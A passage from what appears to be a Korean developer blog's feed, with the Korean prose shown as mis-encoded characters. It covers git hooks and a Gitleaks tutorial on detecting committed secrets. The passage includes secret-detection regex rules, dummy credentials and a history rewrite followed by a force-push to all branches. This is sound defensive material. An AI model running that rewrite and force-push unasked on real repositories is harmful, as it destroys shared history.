class="variable">$files</span>&quot;</span> | xargs npx prettier --write</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$files</span>&quot;</span> | xargs git add</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;âœ… Files formatted&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h3 id="ë¸Œëœì¹˜-ë„¤ì´ë°-ê²€ì¦"><a href="#ë¸Œëœì¹˜-ë„¤ì´ë°-ê²€ì¦" class="headerlink" title="ë¸Œëœì¹˜ ë„¤ì´ë° ê²€ì¦"></a>ë¸Œëœì¹˜ ë„¤ì´ë° ê²€ì¦</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># .git/hooks/pre-push</span></span><br><span class="line"></span><br><span class="line">branch_name=$(git symbolic-ref --short HEAD)</span><br><span class="line">valid_pattern=<span class="string">&quot;^(feature|bugfix|hotfix|release)/[a-z0-9-]+$&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$branch_name</span>&quot;</span> | grep -qE <span class="string">&quot;<span class="variable">$valid_pattern</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;âŒ Invalid branch name: <span class="variable">$branch_name</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Branch name must follow pattern: type/description&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Valid types: feature, bugfix, hotfix, release&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Example: feature/user-authentication&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;âœ… Branch name is valid&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Hook-ë””ë²„ê¹…"><a href="#Hook-ë””ë²„ê¹…" class="headerlink" title="Hook ë””ë²„ê¹…"></a>Hook ë””ë²„ê¹…</h2><p>Hookì´ ì œëŒ€ë¡œ ë™ì‘í•˜ì§€ ì•Šì„ ë•Œ ë””ë²„ê¹… ë°©ë²•:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hook ìŠ¤í¬ë¦½íŠ¸ì— ë””ë²„ê·¸ ëª¨ë“œ ì¶”ê°€</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">set</span> -x  <span class="comment"># ëª¨ë“  ëª…ë ¹ì–´ ì¶œë ¥</span></span><br><span class="line"><span class="built_in">set</span> -e  <span class="comment"># ì—ëŸ¬ ë°œìƒ ì‹œ ì¦‰ì‹œ ì¤‘ë‹¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ë¡œê·¸ íŒŒì¼ ìƒì„±</span></span><br><span class="line"><span class="built_in">exec</span> 2&gt; /tmp/git-hook-debug.log</span><br><span class="line"><span class="built_in">set</span> -x</span><br><span class="line"></span><br><span class="line"><span class="comment"># í™˜ê²½ ë³€ìˆ˜ í™•ì¸</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PATH: <span class="variable">$PATH</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PWD: <span class="variable">$PWD</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ìŠ¤í¬ë¦½íŠ¸ ë‚´ìš©...</span></span><br></pre></td></tr></table></figure><h2 id="ë² ìŠ¤íŠ¸-í”„ë™í‹°ìŠ¤"><a href="#ë² ìŠ¤íŠ¸-í”„ë™í‹°ìŠ¤" class="headerlink" title="ë² ìŠ¤íŠ¸ í”„ë™í‹°ìŠ¤"></a>ë² ìŠ¤íŠ¸ í”„ë™í‹°ìŠ¤</h2><ol><li><strong>ë¹ ë¥¸ ì‹¤í–‰</strong>: Hookì€ ìì£¼ ì‹¤í–‰ë˜ë¯€ë¡œ ë¹ ë¥´ê²Œ ë™ì‘í•´ì•¼ í•©ë‹ˆë‹¤</li><li><strong>ëª…í™•í•œ ì—ëŸ¬ ë©”ì‹œì§€</strong>: ì‹¤íŒ¨ ì‹œ ê°œë°œìê°€ ë¬¸ì œë¥¼ ì‰½ê²Œ íŒŒì•…í•  ìˆ˜ ìˆë„ë¡ ì‘ì„±</li><li><strong>ì ì§„ì  ë„ì…</strong>: ì²˜ìŒì—ëŠ” ê²½ê³ ë§Œ ì¶œë ¥í•˜ê³ , íŒ€ì´ ì ì‘í•œ í›„ ê°•ì œ ì ìš©</li><li><strong>ë¬¸ì„œí™”</strong>: í”„ë¡œì íŠ¸ì— ì–´ë–¤ Hookì´ ì„¤ì •ë˜ì–´ ìˆëŠ”ì§€ READMEì— ëª…ì‹œ</li><li><strong>ìš°íšŒ ê°€ëŠ¥</strong>: ê¸´ê¸‰ ìƒí™©ì„ ìœ„í•´ <code>--no-verify</code> ì˜µì…˜ ì‚¬ìš© ê°€ëŠ¥í•˜ë„ë¡ ìœ ì§€</li><li><strong>íŒ€ ê³µìœ </strong>: Husky ë“±ì˜ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ íŒ€ì› ëª¨ë‘ê°€ ë™ì¼í•œ Hook ì‚¬ìš©</li><li><strong>ì ì ˆí•œ ë²”ìœ„</strong>: Pre-commitì€ ë¹ ë¥¸ ê²€ì‚¬ë§Œ, ì „ì²´ í…ŒìŠ¤íŠ¸ëŠ” CI&#x2F;CDì—ì„œ ìˆ˜í–‰</li></ol><h2 id="ì°¸ê³ -ìë£Œ"><a href="#ì°¸ê³ -ìë£Œ" class="headerlink" title="ì°¸ê³  ìë£Œ"></a>ì°¸ê³  ìë£Œ</h2><ul><li><a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks">Git Hooks ê³µì‹ ë¬¸ì„œ</a></li><li><a href="https://typicode.github.io/husky/">Husky</a></li><li><a href="https://www.conventionalcommits.org/">Conventional Commits</a></li><li><a href="https://commitlint.js.org/">commitlint</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Develop/">Develop</category>
      
      <category domain="https://ckck803.github.io/categories/Develop/Git/">Git</category>
      
      
      <category domain="https://ckck803.github.io/tags/Git/">Git</category>
      
      <category domain="https://ckck803.github.io/tags/Automation/">Automation</category>
      
      <category domain="https://ckck803.github.io/tags/Hook/">Hook</category>
      
      
      <comments>https://ckck803.github.io/2025/12/22/git/git-hooks/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Git - Gitleaksë¡œ ë¯¼ê°ì •ë³´ íƒì§€í•˜ê¸°</title>
      <link>https://ckck803.github.io/2025/12/22/git/gitleaks/</link>
      <guid>https://ckck803.github.io/2025/12/22/git/gitleaks/</guid>
      <pubDate>Sun, 21 Dec 2025 15:00:00 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;img src=&quot;/images/git/git.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Gitleaksë€&quot;&gt;&lt;a href=&quot;#Gitleaksë€&quot; class=&quot;headerlink&quot; title=&quot;Gitleaksë€?&quot;&gt;&lt;/a&gt;Gitleaksë€?&lt;/h2&gt;&lt;p&gt;GitleaksëŠ” Git ì €ì¥ì†Œì—ì„œ ë¹„ë°€ë²ˆí˜¸, API í‚¤, í† í°ê³¼ ê°™ì€ ë¯¼ê°í•œ ì •ë³´(secrets)ë¥¼ íƒì§€í•˜ëŠ” ì˜¤í”ˆì†ŒìŠ¤ ë³´ì•ˆ ë„êµ¬ì…ë‹ˆë‹¤. ì½”ë“œë¥¼ ì»¤ë°‹í•˜ê¸° ì „ì´ë‚˜ CI&amp;#x2F;CD íŒŒì´í”„ë¼ì¸ì—ì„œ ì‹¤í–‰í•˜ì—¬ ì‹¤ìˆ˜ë¡œ ë¯¼ê°ì •ë³´ê°€ ì½”ë“œ ì €ì¥ì†Œì— í¬í•¨ë˜ëŠ” ê²ƒì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;h2 id=&quot;ì£¼ìš”-íŠ¹ì§•&quot;&gt;&lt;a href=&quot;#ì£¼ìš”-íŠ¹ì§•&quot; class=&quot;headerlink&quot; title=&quot;ì£¼ìš” íŠ¹ì§•&quot;&gt;&lt;/a&gt;ì£¼ìš” íŠ¹ì§•&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ë¹ ë¥¸ ìŠ¤ìº”&lt;/strong&gt;: Go ì–¸ì–´ë¡œ ì‘ì„±ë˜ì–´ ë¹ ë¥¸ ì„±ëŠ¥ ì œê³µ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ë‹¤ì–‘í•œ íƒì§€ ê·œì¹™&lt;/strong&gt;: 100ê°œ ì´ìƒì˜ ë‚´ì¥ ê·œì¹™ìœ¼ë¡œ ì£¼ìš” ì„œë¹„ìŠ¤ì˜ ë¹„ë°€ì •ë³´ íƒì§€&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ì»¤ìŠ¤í„°ë§ˆì´ì§• ê°€ëŠ¥&lt;/strong&gt;: ì‚¬ìš©ì ì •ì˜ ê·œì¹™ ì¶”ê°€ ê°€ëŠ¥&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Git í†µí•©&lt;/strong&gt;: pre-commit hookìœ¼ë¡œ ì„¤ì • ê°€ëŠ¥&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CI&amp;#x2F;CD í†µí•©&lt;/strong&gt;: GitHub Actions, GitLab CI ë“±ê³¼ ì‰½ê²Œ í†µí•©&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;ì„¤ì¹˜&quot;&gt;&lt;a href=&quot;#ì„¤ì¹˜&quot; class=&quot;headerlink&quot; title=&quot;ì„¤ì¹˜&quot;&gt;&lt;/a&gt;ì„¤ì¹˜&lt;/h2&gt;&lt;h3 id=&quot;macOS-Homebrew&quot;&gt;&lt;a href=&quot;#macOS-Homebrew&quot; class=&quot;headerlink&quot; title=&quot;macOS (Homebrew)&quot;&gt;&lt;/a&gt;macOS (Homebrew)&lt;/h3&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;brew install gitleaks&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;Linux&quot;&gt;&lt;a href=&quot;#Linux&quot; class=&quot;headerlink&quot; title=&quot;Linux&quot;&gt;&lt;/a&gt;Linux&lt;/h3&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Binary ë‹¤ìš´ë¡œë“œ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;wget https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tar -xzf gitleaks_8.18.0_linux_x64.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo &lt;span class=&quot;built_in&quot;&gt;mv&lt;/span&gt; gitleaks /usr/local/bin/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><img src="/images/git/git.png"></p><h2 id="Gitleaksë€"><a href="#Gitleaksë€" class="headerlink" title="Gitleaksë€?"></a>Gitleaksë€?</h2><p>GitleaksëŠ” Git ì €ì¥ì†Œì—ì„œ ë¹„ë°€ë²ˆí˜¸, API í‚¤, í† í°ê³¼ ê°™ì€ ë¯¼ê°í•œ ì •ë³´(secrets)ë¥¼ íƒì§€í•˜ëŠ” ì˜¤í”ˆì†ŒìŠ¤ ë³´ì•ˆ ë„êµ¬ì…ë‹ˆë‹¤. ì½”ë“œë¥¼ ì»¤ë°‹í•˜ê¸° ì „ì´ë‚˜ CI&#x2F;CD íŒŒì´í”„ë¼ì¸ì—ì„œ ì‹¤í–‰í•˜ì—¬ ì‹¤ìˆ˜ë¡œ ë¯¼ê°ì •ë³´ê°€ ì½”ë“œ ì €ì¥ì†Œì— í¬í•¨ë˜ëŠ” ê²ƒì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h2 id="ì£¼ìš”-íŠ¹ì§•"><a href="#ì£¼ìš”-íŠ¹ì§•" class="headerlink" title="ì£¼ìš” íŠ¹ì§•"></a>ì£¼ìš” íŠ¹ì§•</h2><ul><li><strong>ë¹ ë¥¸ ìŠ¤ìº”</strong>: Go ì–¸ì–´ë¡œ ì‘ì„±ë˜ì–´ ë¹ ë¥¸ ì„±ëŠ¥ ì œê³µ</li><li><strong>ë‹¤ì–‘í•œ íƒì§€ ê·œì¹™</strong>: 100ê°œ ì´ìƒì˜ ë‚´ì¥ ê·œì¹™ìœ¼ë¡œ ì£¼ìš” ì„œë¹„ìŠ¤ì˜ ë¹„ë°€ì •ë³´ íƒì§€</li><li><strong>ì»¤ìŠ¤í„°ë§ˆì´ì§• ê°€ëŠ¥</strong>: ì‚¬ìš©ì ì •ì˜ ê·œì¹™ ì¶”ê°€ ê°€ëŠ¥</li><li><strong>Git í†µí•©</strong>: pre-commit hookìœ¼ë¡œ ì„¤ì • ê°€ëŠ¥</li><li><strong>CI&#x2F;CD í†µí•©</strong>: GitHub Actions, GitLab CI ë“±ê³¼ ì‰½ê²Œ í†µí•©</li></ul><h2 id="ì„¤ì¹˜"><a href="#ì„¤ì¹˜" class="headerlink" title="ì„¤ì¹˜"></a>ì„¤ì¹˜</h2><h3 id="macOS-Homebrew"><a href="#macOS-Homebrew" class="headerlink" title="macOS (Homebrew)"></a>macOS (Homebrew)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">brew install gitleaks</span><br></pre></td></tr></table></figure><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Binary ë‹¤ìš´ë¡œë“œ</span></span><br><span class="line">wget https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz</span><br><span class="line">tar -xzf gitleaks_8.18.0_linux_x64.tar.gz</span><br><span class="line">sudo <span class="built_in">mv</span> gitleaks /usr/local/bin/</span><br></pre></td></tr></table></figure><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull zricethezav/gitleaks:latest</span><br></pre></td></tr></table></figure><h2 id="ê¸°ë³¸-ì‚¬ìš©ë²•"><a href="#ê¸°ë³¸-ì‚¬ìš©ë²•" class="headerlink" title="ê¸°ë³¸ ì‚¬ìš©ë²•"></a>ê¸°ë³¸ ì‚¬ìš©ë²•</h2><h3 id="í˜„ì¬-ì €ì¥ì†Œ-ìŠ¤ìº”"><a href="#í˜„ì¬-ì €ì¥ì†Œ-ìŠ¤ìº”" class="headerlink" title="í˜„ì¬ ì €ì¥ì†Œ ìŠ¤ìº”"></a>í˜„ì¬ ì €ì¥ì†Œ ìŠ¤ìº”</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì „ì²´ ì €ì¥ì†Œ íˆìŠ¤í† ë¦¬ ìŠ¤ìº”</span></span><br><span class="line">gitleaks detect</span><br><span class="line"></span><br><span class="line"><span class="comment"># í˜„ì¬ ë³€ê²½ì‚¬í•­ë§Œ ìŠ¤ìº”</span></span><br><span class="line">gitleaks protect</span><br><span class="line"></span><br><span class="line"><span class="comment"># íŠ¹ì • ë””ë ‰í† ë¦¬ ìŠ¤ìº”</span></span><br><span class="line">gitleaks detect --<span class="built_in">source</span> /path/to/repo</span><br></pre></td></tr></table></figure><h3 id="ê²°ê³¼-ì¶œë ¥-í˜•ì‹-ì§€ì •"><a href="#ê²°ê³¼-ì¶œë ¥-í˜•ì‹-ì§€ì •" class="headerlink" title="ê²°ê³¼ ì¶œë ¥ í˜•ì‹ ì§€ì •"></a>ê²°ê³¼ ì¶œë ¥ í˜•ì‹ ì§€ì •</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># JSON í˜•ì‹ìœ¼ë¡œ ì¶œë ¥</span></span><br><span class="line">gitleaks detect --report-format json --report-path report.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># SARIF í˜•ì‹ìœ¼ë¡œ ì¶œë ¥ (GitHub Code Scanningìš©)</span></span><br><span class="line">gitleaks detect --report-format sarif --report-path report.sarif</span><br><span class="line"></span><br><span class="line"><span class="comment"># CSV í˜•ì‹ìœ¼ë¡œ ì¶œë ¥</span></span><br><span class="line">gitleaks detect --report-format csv --report-path report.csv</span><br></pre></td></tr></table></figure><h2 id="ì„¤ì •-íŒŒì¼-gitleaks-toml"><a href="#ì„¤ì •-íŒŒì¼-gitleaks-toml" class="headerlink" title="ì„¤ì • íŒŒì¼ (gitleaks.toml)"></a>ì„¤ì • íŒŒì¼ (gitleaks.toml)</h2><p>í”„ë¡œì íŠ¸ ë£¨íŠ¸ì— <code>.gitleaks.toml</code> íŒŒì¼ì„ ìƒì„±í•˜ì—¬ ì»¤ìŠ¤í„°ë§ˆì´ì§•í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title</span> = <span class="string">&quot;Gitleaks Configuration&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ì „ì—­ allowlist</span></span><br><span class="line"><span class="section">[allowlist]</span></span><br><span class="line"><span class="attr">description</span> = <span class="string">&quot;Global Allowlist&quot;</span></span><br><span class="line"><span class="attr">regexes</span> = [</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;219-09-\d&#123;5&#125;&#x27;&#x27;&#x27;</span>,  <span class="comment"># ì£¼ë¯¼ë“±ë¡ë²ˆí˜¸ íŒ¨í„´ ì˜ˆì™¸</span></span><br><span class="line">]</span><br><span class="line"><span class="attr">paths</span> = [</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;node_modules/&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;vendor/&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;.git/&#x27;&#x27;&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì»¤ìŠ¤í…€ ê·œì¹™ ì¶”ê°€</span></span><br><span class="line"><span class="section">[[rules]]</span></span><br><span class="line"><span class="attr">id</span> = <span class="string">&quot;custom-api-key&quot;</span></span><br><span class="line"><span class="attr">description</span> = <span class="string">&quot;Custom API Key&quot;</span></span><br><span class="line"><span class="attr">regex</span> = <span class="string">&#x27;&#x27;&#x27;(?i)custom[_-]?api[_-]?key[_-]?=\s*[&#x27;&quot;]?([a-z0-9]&#123;32&#125;)[&#x27;&quot;]?&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="attr">tags</span> = [<span class="string">&quot;api&quot;</span>, <span class="string">&quot;key&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì—”íŠ¸ë¡œí”¼ ê¸°ë°˜ íƒì§€</span></span><br><span class="line"><span class="section">[[rules]]</span></span><br><span class="line"><span class="attr">id</span> = <span class="string">&quot;high-entropy-string&quot;</span></span><br><span class="line"><span class="attr">description</span> = <span class="string">&quot;High Entropy String (possible secret)&quot;</span></span><br><span class="line"><span class="attr">regex</span> = <span class="string">&#x27;&#x27;&#x27;[a-zA-Z0-9+/]&#123;40,&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="attr">entropy</span> = <span class="number">4.5</span></span><br></pre></td></tr></table></figure><h3 id="íŠ¹ì •-íŒŒì¼-ë¼ì¸-ì œì™¸í•˜ê¸°"><a href="#íŠ¹ì •-íŒŒì¼-ë¼ì¸-ì œì™¸í•˜ê¸°" class="headerlink" title="íŠ¹ì • íŒŒì¼&#x2F;ë¼ì¸ ì œì™¸í•˜ê¸°"></a>íŠ¹ì • íŒŒì¼&#x2F;ë¼ì¸ ì œì™¸í•˜ê¸°</h3><p>ì½”ë“œì— ì§ì ‘ ì£¼ì„ìœ¼ë¡œ í‘œì‹œ:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gitleaks:allow</span></span><br><span class="line"><span class="keyword">const</span> apiKey = <span class="string">&quot;test-api-key-1234567890&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> password = <span class="string">&quot;secret123&quot;</span>; <span class="comment">// gitleaks:allow</span></span><br></pre></td></tr></table></figure><h2 id="Pre-commit-Hook-ì„¤ì •"><a href="#Pre-commit-Hook-ì„¤ì •" class="headerlink" title="Pre-commit Hook ì„¤ì •"></a>Pre-commit Hook ì„¤ì •</h2><p>Git hookìœ¼ë¡œ ì»¤ë°‹ ì „ ìë™ ìŠ¤ìº”:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># .git/hooks/pre-commit íŒŒì¼ ìƒì„±</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">&#x27;EOF&#x27;</span> &gt; .git/hooks/pre-commit</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">gitleaks protect --verbose --redact --staged</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Warning: Gitleaks detected sensitive information.&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Please remove it before committing.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x .git/hooks/pre-commit</span><br></pre></td></tr></table></figure><h2 id="CI-CD-í†µí•©"><a href="#CI-CD-í†µí•©" class="headerlink" title="CI&#x2F;CD í†µí•©"></a>CI&#x2F;CD í†µí•©</h2><h3 id="GitHub-Actions"><a href="#GitHub-Actions" class="headerlink" title="GitHub Actions"></a>GitHub Actions</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Gitleaks</span></span><br><span class="line"><span class="attr">on:</span> [<span class="string">push</span>, <span class="string">pull_request</span>]</span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">scan:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">fetch-depth:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Run</span> <span class="string">Gitleaks</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">gitleaks/gitleaks-action@v2</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">GITHUB_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="GitLab-CI"><a href="#GitLab-CI" class="headerlink" title="GitLab CI"></a>GitLab CI</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">gitleaks:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">zricethezav/gitleaks:latest</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">gitleaks</span> <span class="string">detect</span> <span class="string">--source</span> <span class="string">.</span> <span class="string">--verbose</span> <span class="string">--redact</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">merge_requests</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">main</span></span><br></pre></td></tr></table></figure><h2 id="ì£¼ìš”-ì˜µì…˜"><a href="#ì£¼ìš”-ì˜µì…˜" class="headerlink" title="ì£¼ìš” ì˜µì…˜"></a>ì£¼ìš” ì˜µì…˜</h2><table><thead><tr><th>ì˜µì…˜</th><th>ì„¤ëª…</th></tr></thead><tbody><tr><td><code>detect</code></td><td>ì „ì²´ ì €ì¥ì†Œ íˆìŠ¤í† ë¦¬ ìŠ¤ìº”</td></tr><tr><td><code>protect</code></td><td>staged ë³€ê²½ì‚¬í•­ë§Œ ìŠ¤ìº” (pre-commitìš©)</td></tr><tr><td><code>--verbose</code></td><td>ìƒì„¸ ì¶œë ¥</td></tr><tr><td><code>--redact</code></td><td>íƒì§€ëœ ë¹„ë°€ì •ë³´ë¥¼ ë§ˆìŠ¤í‚¹ ì²˜ë¦¬</td></tr><tr><td><code>--no-git</code></td><td>Git ì €ì¥ì†Œê°€ ì•„ë‹Œ ì¼ë°˜ ë””ë ‰í† ë¦¬ ìŠ¤ìº”</td></tr><tr><td><code>--config</code></td><td>ì»¤ìŠ¤í…€ ì„¤ì • íŒŒì¼ ê²½ë¡œ ì§€ì •</td></tr><tr><td><code>--baseline-path</code></td><td>ê¸°ì¤€ì„  íŒŒì¼ ì§€ì • (ì´ì „ ìŠ¤ìº” ê²°ê³¼ ì œì™¸)</td></tr></tbody></table><h2 id="íƒì§€-ì˜ˆì‹œ"><a href="#íƒì§€-ì˜ˆì‹œ" class="headerlink" title="íƒì§€ ì˜ˆì‹œ"></a>íƒì§€ ì˜ˆì‹œ</h2><p>Gitleaksê°€ íƒì§€í•  ìˆ˜ ìˆëŠ” ì£¼ìš” ë¹„ë°€ì •ë³´:</p><ul><li>AWS Access Key &amp; Secret Key</li><li>GitHub Token</li><li>GitLab Token</li><li>Slack Token</li><li>Google API Key</li><li>Private SSH Keys</li><li>Database ì—°ê²° ë¬¸ìì—´</li><li>JWT Tokens</li><li>OAuth Credentials</li><li>Stripe API Keys</li><li>Twilio API Keys</li></ul><h2 id="ì´ë¯¸-ì»¤ë°‹ëœ-ë¹„ë°€ì •ë³´-ì œê±°í•˜ê¸°"><a href="#ì´ë¯¸-ì»¤ë°‹ëœ-ë¹„ë°€ì •ë³´-ì œê±°í•˜ê¸°" class="headerlink" title="ì´ë¯¸ ì»¤ë°‹ëœ ë¹„ë°€ì •ë³´ ì œê±°í•˜ê¸°"></a>ì´ë¯¸ ì»¤ë°‹ëœ ë¹„ë°€ì •ë³´ ì œê±°í•˜ê¸°</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. ë¹„ë°€ì •ë³´ê°€ í¬í•¨ëœ íŒŒì¼ ì°¾ê¸°</span></span><br><span class="line">gitleaks detect --verbose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Git íˆìŠ¤í† ë¦¬ì—ì„œ íŒŒì¼ ì œê±° (BFG Repo-Cleaner ì‚¬ìš©)</span></span><br><span class="line">brew install bfg</span><br><span class="line">bfg --delete-files secret-file.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. ë˜ëŠ” git filter-branch ì‚¬ìš©</span></span><br><span class="line">git filter-branch --force --index-filter \</span><br><span class="line">  <span class="string">&quot;git rm --cached --ignore-unmatch path/to/secret-file&quot;</span> \</span><br><span class="line">  --prune-empty --tag-name-filter <span class="built_in">cat</span> -- --all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. ê°•ì œ í‘¸ì‹œ</span></span><br><span class="line">git push origin --force --all</span><br></pre></td></tr></table></figure><h2 id="ë² ìŠ¤íŠ¸-í”„ë™í‹°ìŠ¤"><a href="#ë² ìŠ¤íŠ¸-í”„ë™í‹°ìŠ¤" class="headerlink" title="ë² ìŠ¤íŠ¸ í”„ë™í‹°ìŠ¤"></a>ë² ìŠ¤íŠ¸ í”„ë™í‹°ìŠ¤</h2><ol><li><strong>Pre-commit Hook ì‚¬ìš©</strong>: ì»¤ë°‹ ì „ ìë™ìœ¼ë¡œ ìŠ¤ìº”í•˜ì—¬ ì‚¬ì „ ì˜ˆë°©</li><li><strong>CI&#x2F;CD íŒŒì´í”„ë¼ì¸ í†µí•©</strong>: ëª¨ë“  PRì—ì„œ ìë™ ê²€ì‚¬</li><li><strong>ì •ê¸°ì ì¸ ì „ì²´ ìŠ¤ìº”</strong>: ì£¼ê¸°ì ìœ¼ë¡œ ì „ì²´ ì €ì¥ì†Œ ìŠ¤ìº”</li><li><strong>í™˜ê²½ë³€ìˆ˜ ì‚¬ìš©</strong>: ë¯¼ê°ì •ë³´ëŠ” <code>.env</code> íŒŒì¼ê³¼ í™˜ê²½ë³€ìˆ˜ë¡œ ê´€ë¦¬</li><li><strong><code>.gitignore</code> ì„¤ì •</strong>: <code>.env</code>, <code>credentials.json</code> ë“± ë¯¼ê° íŒŒì¼ ì œì™¸</li><li><strong>íŒ€ êµìœ¡</strong>: ê°œë°œìë“¤ì—ê²Œ ë³´ì•ˆ ì˜ì‹ ê³ ì·¨</li></ol>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Develop/">Develop</category>
      
